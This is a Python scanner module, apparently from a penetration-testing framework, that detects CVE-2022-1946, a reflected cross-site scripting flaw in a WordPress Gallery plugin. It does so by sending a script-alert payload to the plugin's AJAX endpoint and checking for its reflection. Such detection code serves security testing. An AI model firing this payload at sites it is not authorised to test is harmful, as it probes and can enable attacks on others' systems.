#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Gallery plugin before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Gallery <2.0.0 - Cross-Site Scripting Detection',
        'description': 'WordPress Gallery plugin before 2.0.0 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the response of an AJAX action, available to both unauthenticated and authenticated users.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wpscan', 'wp', 'xss', 'wordpress', 'gallery', 'unauth', 'wp-plugin', 'wpdevart', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/0903920c-be2e-4515-901f-87253eb30940',
            'https://wordpress.org/plugins/gallery-album',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1946',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/cyllective/CVEs',
        ],
        'cve': 'CVE-2022-1946',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=<script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('wpdevar_gall_img_url_h[<script>alert(document.domain)</script>]',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Gallery <2.0.0 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=<script>alert(document.domain)</script>',
            )
            return True
        return False

